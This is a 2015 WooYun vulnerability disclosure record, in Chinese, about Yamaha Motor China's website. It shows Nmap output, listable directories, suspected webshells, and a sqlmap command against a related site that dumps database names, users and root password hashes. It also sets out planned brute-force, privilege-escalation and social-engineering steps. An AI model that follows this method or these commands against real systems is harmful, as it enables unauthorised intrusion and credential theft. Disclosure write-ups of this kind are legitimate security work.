{"id": 84733, "wybug_id": "wooyun-2015-0143312", "wybug_title": "雅马哈官网各种漏洞目录遍历&amp;SQL注入", "wybug_corp": "雅马哈官网", "wybug_author": "Big show", "wybug_date": "2015-10-16 12:09", "wybug_open_date": "2015-12-04 18:00", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-04：\t细节向公众公开  简要描述： 目标站：www.yamaha-motor.com.cn 详细说明：  -----------------域名注册信息          雅马哈发动机株式会社 | 雅马哈发动机株式会社域名持有certadmin@**.**.**.**\t雅马哈发动机（厦门）信息系统有限公司 拥有 2 个站点， 与 2 个站点有关联**.**.**.****.**.**.** ------------------同服查询（判断启用cnd还是真实主机）**.**.**.**|真实主机同服dc.**.**.**.**------------------扫描网站ip端口  尝试寻找弱口令的机会Starting Nmap 6.49BETA4 ( https://**.**.**.** ) at 2015-09-12 00:58 CSTNSE: Loaded 122 scripts for scanning.NSE: Script Pre-scanning.Initiating NSE at 00:58Completed NSE at 00:58, 0.00s elapsedInitiating NSE at 00:58Completed NSE at 00:58, 0.00s elapsedInitiating Ping Scan at 00:58Scanning **.**.**.** [4 ports]Completed Ping Scan at 00:58, 0.22s elapsed (1 total hosts)Initiating Parallel DNS resolution of 1 host. at 00:58Completed Parallel DNS resolution of 1 host. at 00:58, 0.07s elapsedInitiating SYN Stealth Scan at 00:58Scanning **.**.**.** [1000 ports]Discovered open port 80/tcp on **.**.**.**Completed SYN Stealth Scan at 00:59, 11.08s elapsed (1000 total ports)Initiating Service scan at 00:59Scanning 1 service on **.**.**.**Completed Service scan at 00:59, 6.32s elapsed (1 service on 1 host)Initiating OS detection (try #1) against **.**.**.**Initiating Traceroute at 00:59Completed Traceroute at 00:59, 3.02s elapsedInitiating Parallel DNS resolution of 10 hosts. at 00:59Completed Parallel DNS resolution of 10 hosts. at 00:59, 10.04s elapsedNSE: Script scanning **.**.**.**.Initiating NSE at 00:59Completed NSE at 00:59, 2.38s elapsedInitiating NSE at 00:59Completed NSE at 00:59, 0.00s elapsedNmap scan report for **.**.**.**Host is up (0.079s latency).Not shown: 999 filtered portsPORT   STATE SERVICE VERSION80/tcp open  http    Apache httpd 2.2.3 ((CentOS))| http-methods: GET HEAD POST OPTIONS TRACE| Potentially risky methods: TRACE|_See http://**.**.**.**/nsedoc/scripts/http-methods.html|_http-server-header: Apache/2.2.3 (CentOS)|_http-title: \\xE9\\x9B\\x85\\xE9\\xA9\\xAC\\xE5\\x93\\x88\\xE5\\x8F\\x91\\xE5\\x8A\\xA8\\xE6\\x9C\\xBA\\xE6\\xA0\\xAA\\xE5\\xBC\\x8F\\xE4\\xBC\\x9A\\xE7\\xA4\\xBE | \\xE9\\x9B\\x85\\xE9\\xA9\\xAC\\xE5\\x93\\x88\\xE5\\x8F\\x91\\xE5\\x8A\\xA8\\xE6\\x9C\\xBA\\xE6\\xA0\\xAA\\xE5\\xBC\\x8F\\xE4\\xBC\\x9A\\xE7\\xA4\\xBEWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: general purposeRunning: Linux 2.6.XOS CPE: cpe:/o:linux:linux_kernel:2.6OS details: Linux 2.6.9 - 2.6.18Uptime guess: 27.207 days (since Sat Aug 15 20:01:10 2015)Network Distance: 12 hopsTCP Sequence Prediction: Difficulty=260 (Good luck!)IP ID Sequence Generation: All zerosTRACEROUTE (using port 80/tcp)HOP RTT      ADDRESS1   10.33 ms **.**.**.**2   30.34 ms **.**.**.**.**.**.**.** (**.**.**.**)3   30.40 ms **.**.**.**.**.**.**.** (**.**.**.**)4   8.00 ms  **.**.**.**5   ...6   12.77 ms **.**.**.**7   42.44 ms **.**.**.**8   46.08 ms **.**.**.**9   47.46 ms **.**.**.**10  46.44 ms **.**.**.** (**.**.**.**)11  35.67 ms **.**.**.**12  89.92 ms **.**.**.**NSE: Script Post-scanning.Initiating NSE at 00:59Completed NSE at 00:59, 0.00s elapsedInitiating NSE at 00:59Completed NSE at 00:59, 0.00s elapsedRead data files from: /usr/bin/../share/nmapOS and Service detection performed. Please report any incorrect results at https://**.**.**.**/submit/ .Nmap done: 1 IP address (1 host up) scanned in 39.34 seconds           Raw packets sent: 2078 (94.024KB) | Rcvd: 46 (3.404KB)------------------判断cms无法判断cms 肥猪流cms ------------------扫描网站目录 寻找可疑目录 以及目录下的漏洞 弱口令等http://www.**.**.**.**/marine/data/attachment/file/m.php  可疑一句话 爆破无果http://www.**.**.**.**/marine/data/attachment/file/md5.php  可疑一句话 爆破无果http://www.**.**.**.**/marine/data/attachment/file/ 列目录http://www.**.**.**.**/marine/data/attachment/file/fa/ 寄生虫页面http://www.**.**.**.**/marine/data/attachment/file/php.ini phpinihttp://www.**.**.**.**/marine/data/attachment/file/yea/ 寄生虫页面http://www.**.**.**.**/marine/data/attachment/ 寄生虫页面http://www.**.**.**.**/marine/data/ 列目录http://www.**.**.**.**/manual/  Apache HTTP Server Version 2.2配置文档http://www.**.**.**.**/home/ 列目录http://www.**.**.**.**/images/ 列目录http://www.**.**.**.**/css/ 列目录http://www.**.**.**.**/js/ 列目录http://www.**.**.**.**/js/ 列目录http://www.**.**.**.**/shared/ 列目录http://www.**.**.**.**/swf/ 列目录http://www.**.**.**.**//icons/README 敏感信息------------------扫描 和手工寻找网站程序漏洞 或者网站cms漏洞 以达到getshell目的------------------收集旁站信息旁站和主站一套程序打算放弃的时候有点小发现 啧啧------------------扫描旁站信息[root@Hacker~]# Sqlmap -u \"http://dc.**.**.**.**/marine/boat/store_detail.php?id=7\" --dbs 注入available databases [8]:[*] brophp[*] brophp_new[*] icats[*] information_schema[*] marine[*] mysql[*] performance_schema[*] pp--users[01:43:32] [INFO] retrieved: 'brophp_user'@'localhost'database management system users [113]:[*] 'brophp_user'@'localhost'[*] 'root'@'**.**.**.**'[*] 'root'@'::1'[*] 'root'@'localhost'[*] 'root'@'**.**.**.**'--passworddatabase management system users password hashes:[*] brophp_user [1]:    password hash: NULL[*] root [3]:    password hash: 190199e35b009e27    password hash: 6a0845a86d947e48    password hash: NULL--------------------------------------------------------一个登陆口http://dc.**.**.**.**/ymclocal/login.php------------------扫描旁站端口 尝试弱口令爆破等-----------------扫描旁站目录敏感信息，以及目录下的漏洞 尝试后台登录等略过 -----------------判断旁站cms 以及寻找旁站程序漏洞等 从而达到getshell目的略过----------------拿到旁站shell 提权 执行命令 上传exp 寻找数据库配置 以及网站敏感信息等 如提权不成功 可尝试已经收集到的信息尝试社工等----------------扫描C段信息 方法以上述雷同###！！！https://**.**.**.**/YMSMYbs/ （**.**.**.**）c段办公系统 后天尝试爆破https://**.**.**.**/dealer/ 后台管理坑爹（**.**.**.**）   漏洞证明：  -----------------域名注册信息          雅马哈发动机株式会社 | 雅马哈发动机株式会社域名持有certadmin@**.**.**.**\t雅马哈发动机（厦门）信息系统有限公司 拥有 2 个站点， 与 2 个站点有关联**.**.**.****.**.**.** ------------------同服查询（判断启用cnd还是真实主机）**.**.**.**|真实主机同服dc.**.**.**.**------------------扫描网站ip端口  尝试寻找弱口令的机会Starting Nmap 6.49BETA4 ( https://**.**.**.** ) at 2015-09-12 00:58 CSTNSE: Loaded 122 scripts for scanning.NSE: Script Pre-scanning.Initiating NSE at 00:58Completed NSE at 00:58, 0.00s elapsedInitiating NSE at 00:58Completed NSE at 00:58, 0.00s elapsedInitiating Ping Scan at 00:58Scanning **.**.**.** [4 ports]Completed Ping Scan at 00:58, 0.22s elapsed (1 total hosts)Initiating Parallel DNS resolution of 1 host. at 00:58Completed Parallel DNS resolution of 1 host. at 00:58, 0.07s elapsedInitiating SYN Stealth Scan at 00:58Scanning **.**.**.** [1000 ports]Discovered open port 80/tcp on **.**.**.**Completed SYN Stealth Scan at 00:59, 11.08s elapsed (1000 total ports)Initiating Service scan at 00:59Scanning 1 service on **.**.**.**Completed Service scan at 00:59, 6.32s elapsed (1 service on 1 host)Initiating OS detection (try #1) against **.**.**.**Initiating Traceroute at 00:59Completed Traceroute at 00:59, 3.02s elapsedInitiating Parallel DNS resolution of 10 hosts. at 00:59Completed Parallel DNS resolution of 10 hosts. at 00:59, 10.04s elapsedNSE: Script scanning **.**.**.**.Initiating NSE at 00:59Completed NSE at 00:59, 2.38s elapsedInitiating NSE at 00:59Completed NSE at 00:59, 0.00s elapsedNmap scan report for **.**.**.**Host is up (0.079s latency).Not shown: 999 filtered portsPORT   STATE SERVICE VERSION80/tcp open  http    Apache httpd 2.2.3 ((CentOS))| http-methods: GET HEAD POST OPTIONS TRACE| Potentially risky methods: TRACE|_See http://**.**.**.**/nsedoc/scripts/http-methods.html|_http-server-header: Apache/2.2.3 (CentOS)|_http-title: \\xE9\\x9B\\x85\\xE9\\xA9\\xAC\\xE5\\x93\\x88\\xE5\\x8F\\x91\\xE5\\x8A\\xA8\\xE6\\x9C\\xBA\\xE6\\xA0\\xAA\\xE5\\xBC\\x8F\\xE4\\xBC\\x9A\\xE7\\xA4\\xBE | \\xE9\\x9B\\x85\\xE9\\xA9\\xAC\\xE5\\x93\\x88\\xE5\\x8F\\x91\\xE5\\x8A\\xA8\\xE6\\x9C\\xBA\\xE6\\xA0\\xAA\\xE5\\xBC\\x8F\\xE4\\xBC\\x9A\\xE7\\xA4\\xBEWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: general purposeRunning: Linux 2.6.XOS CPE: cpe:/o:linux:linux_kernel:2.6OS details: Linux 2.6.9 - 2.6.18Uptime guess: 27.207 days (since Sat Aug 15 20:01:10 2015)Network Distance: 12 hopsTCP Sequence Prediction: Difficulty=260 (Good luck!)IP ID Sequence Generation: All zerosTRACEROUTE (using port 80/tcp)HOP RTT      ADDRESS1   10.33 ms **.**.**.**2   30.34 ms **.**.**.**.**.**.**.** (**.**.**.**)3   30.40 ms **.**.**.**.**.**.**.** (**.**.**.**)4   8.00 ms  **.**.**.**5   ...6   12.77 ms **.**.**.**7   42.44 ms **.**.**.**8   46.08 ms **.**.**.**9   47.46 ms **.**.**.**10  46.44 ms **.**.**.** (**.**.**.**)11  35.67 ms **.**.**.**12  89.92 ms **.**.**.**NSE: Script Post-scanning.Initiating NSE at 00:59Completed NSE at 00:59, 0.00s elapsedInitiating NSE at 00:59Completed NSE at 00:59, 0.00s elapsedRead data files from: /usr/bin/../share/nmapOS and Service detection performed. Please report any incorrect results at https://**.**.**.**/submit/ .Nmap done: 1 IP address (1 host up) scanned in 39.34 seconds           Raw packets sent: 2078 (94.024KB) | Rcvd: 46 (3.404KB)------------------判断cms无法判断cms 肥猪流cms ------------------扫描网站目录 寻找可疑目录 以及目录下的漏洞 弱口令等http://www.**.**.**.**/marine/data/attachment/file/m.php  可疑一句话 爆破无果http://www.**.**.**.**/marine/data/attachment/file/md5.php  可疑一句话 爆破无果http://www.**.**.**.**/marine/data/attachment/file/ 列目录http://www.**.**.**.**/marine/data/attachment/file/fa/ 寄生虫页面http://www.**.**.**.**/marine/data/attachment/file/php.ini phpinihttp://www.**.**.**.**/marine/data/attachment/file/yea/ 寄生虫页面http://www.**.**.**.**/marine/data/attachment/ 寄生虫页面http://www.**.**.**.**/marine/data/ 列目录http://www.**.**.**.**/manual/  Apache HTTP Server Version 2.2配置文档http://www.**.**.**.**/home/ 列目录http://www.**.**.**.**/images/ 列目录http://www.**.**.**.**/css/ 列目录http://www.**.**.**.**/js/ 列目录http://www.**.**.**.**/js/ 列目录http://www.**.**.**.**/shared/ 列目录http://www.**.**.**.**/swf/ 列目录http://www.**.**.**.**//icons/README 敏感信息------------------扫描 和手工寻找网站程序漏洞 或者网站cms漏洞 以达到getshell目的------------------收集旁站信息旁站和主站一套程序打算放弃的时候有点小发现 啧啧------------------扫描旁站信息[root@Hacker~]# Sqlmap -u \"http://dc.**.**.**.**/marine/boat/store_detail.php?id=7\" --dbs 注入available databases [8]:[*] brophp[*] brophp_new[*] icats[*] information_schema[*] marine[*] mysql[*] performance_schema[*] pp--users[01:43:32] [INFO] retrieved: 'brophp_user'@'localhost'database management system users [113]:[*] 'brophp_user'@'localhost'[*] 'root'@'**.**.**.**'[*] 'root'@'::1'[*] 'root'@'localhost'[*] 'root'@'**.**.**.**'--passworddatabase management system users password hashes:[*] brophp_user [1]:    password hash: NULL[*] root [3]:    password hash: 190199e35b009e27    password hash: 6a0845a86d947e48    password hash: NULL--------------------------------------------------------一个登陆口http://dc.**.**.**.**/ymclocal/login.php------------------扫描旁站端口 尝试弱口令爆破等-----------------扫描旁站目录敏感信息，以及目录下的漏洞 尝试后台登录等略过 -----------------判断旁站cms 以及寻找旁站程序漏洞等 从而达到getshell目的略过----------------拿到旁站shell 提权 执行命令 上传exp 寻找数据库配置 以及网站敏感信息等 如提权不成功 可尝试已经收集到的信息尝试社工等----------------扫描C段信息 方法以上述雷同###！！！https://**.**.**.**/YMSMYbs/ （**.**.**.**）c段办公系统 后天尝试爆破https://**.**.**.**/dealer/ 后台管理坑爹（**.**.**.**）已经被黑产劫持    修复方案：  过滤注入   修复劫持页面   版权声明：转载请注明来源 Big show@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2015-10-20 18:00 厂商回复： 暂未建立与网站管理单位的直接联系渠道，待认领。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}